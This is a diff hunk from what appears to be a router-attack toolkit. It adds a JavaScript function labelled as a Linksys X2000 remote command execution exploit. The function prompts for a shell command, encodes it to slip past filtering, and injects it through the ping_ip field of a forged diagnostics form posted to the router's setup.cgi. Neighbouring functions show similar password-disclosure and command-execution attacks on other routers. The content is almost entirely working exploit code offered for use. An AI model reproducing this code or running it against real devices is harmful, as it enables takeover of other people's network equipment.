@@ -388,6 +388,27 @@ function rtn16_passdisclosure(ip)
     document.location="http://"+ip+"/error_page.htm";
 }
 
+// Linksys X2000 - Remote Command Execution
+function x2000_command(ip)
+{
+	ip = ip || "192.168.1.1";
+	cmd = prompt("Command:");
+	cmd = encodeURIComponent(cmd).replace(/%20/g, '%09'); // Encode and replace spaces with tabs
+
+	var form = '<input	type="hidden"	name="submit_button"	value="Diagnostics"/>\
+			    <input	type="hidden"	name="change_action"	value="gozila_cgi"/>\
+			    <input	type="hidden"	name="submit_type"		value="start_ping"/>\
+			    <input	type="hidden"	name="action"			value=""/>\
+			    <input	type="hidden"	name="commit"			value="0"/>\
+			    <input	type="hidden"	name="nowait"			value="1"/>\
+			    <input	type="hidden"	name="ping_size"		value="32"/>\
+			    <input	type="hidden"	name="ping_times"		value="5"/>\
+			    <input	type="hidden"	name="ping_ip"			value="' + cmd + '"/>\
+			    </form>';
+
+	post('http://' + ip + '/setup.cgi', form);
+}
+
 // Cisco Linksys WAG200GB - Remote Command Execution
 function wag200gb_command(ip)
 {
